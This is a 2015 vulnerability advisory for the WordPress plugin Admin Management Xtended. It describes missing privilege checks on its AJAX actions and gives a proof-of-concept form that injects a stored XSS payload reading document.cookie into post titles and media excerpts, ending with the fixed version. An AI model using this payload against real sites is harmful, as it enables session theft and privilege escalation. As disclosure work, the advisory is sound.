# Date: 14-12-2015
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: webapps
  
1. Description
    
Inside almost all wp_ajax function there is no privilege check.
 
File: admin-management-xtended\general-functions.php
 
add_action( &#039;wp_ajax_ame_toggle_visibility&#039;, &#039;ame_toggle_visibility&#039; );
add_action( &#039;wp_ajax_ame_set_date&#039;, &#039;ame_set_date&#039; );
add_action( &#039;wp_ajax_ame_save_title&#039;, &#039;ame_save_title&#039; );
add_action( &#039;wp_ajax_ame_save_slug&#039;, &#039;ame_save_slug&#039; );
add_action( &#039;wp_ajax_ame_slug_edit&#039;, &#039;ame_slug_edit&#039; );
add_action( &#039;wp_ajax_ame_save_order&#039;, &#039;ame_save_order&#039; );
add_action( &#039;wp_ajax_ame_toggle_orderoptions&#039;, &#039;ame_toggle_orderoptions&#039; );
add_action( &#039;wp_ajax_ame_toggle_showinvisposts&#039;, &#039;ame_toggle_showinvisposts&#039; );
add_action( &#039;wp_ajax_ame_get_pageorder&#039;, &#039;ame_get_pageorder&#039; );
add_action( &#039;wp_ajax_ame_ajax_save_categories&#039;, &#039;ame_ajax_save_categories&#039; );
add_action( &#039;wp_ajax_ame_ajax_get_categories&#039;, &#039;ame_ajax_get_categories&#039; );
add_action( &#039;wp_ajax_ame_ajax_set_commentstatus&#039;, &#039;ame_ajax_set_commentstatus&#039; );
add_action( &#039;wp_ajax_ame_ajax_save_tags&#039;, &#039;ame_ajax_save_tags&#039; );
add_action( &#039;wp_ajax_ame_ajax_toggle_imageset&#039;, &#039;ame_ajax_toggle_imageset&#039; );
add_action( &#039;wp_ajax_ame_ajax_save_mediadesc&#039;, &#039;ame_ajax_save_mediadesc&#039; );
add_action( &#039;wp_ajax_ame_author_edit&#039;, &#039;ame_author_edit&#039; );
add_action( &#039;wp_ajax_ame_save_author&#039;, &#039;ame_save_author&#039; );
add_action( &#039;wp_ajax_ame_toggle_excludestatus&#039;, &#039;ame_toggle_excludestatus&#039; );
add_action( &#039;wp_ajax_ame_toggle_sticky&#039;, &#039;ame_toggle_sticky&#039; );
 
http://security.szurek.pl/admin-management-xtended-240-privilege-escalation.html
 
2. Proof of Concept
 
Login as regular user (created using wp-login.php?action=register). Then you can change any post title:
 
Post id: <input type="text" name="category_id" value="1">
Post title: <input type="text" name="new_title" value="<script>alert(document.cookie);</script>">
<input type="submit" name="submit" value="Change">
</form>
 
XSS will be visible on post page:
 
 
Or change media excerpt:
 
Post id: <input type="text" name="postid" value="1">
Excerpt: <input type="text" name="new_mediadesc" value="<script>alert(document.cookie);</script>">
<input type="submit" name="submit" value="Change">
</form>
 
XSS will be visible for admin:
 
 
3. Solution:
    
Update to version 2.4.0.1

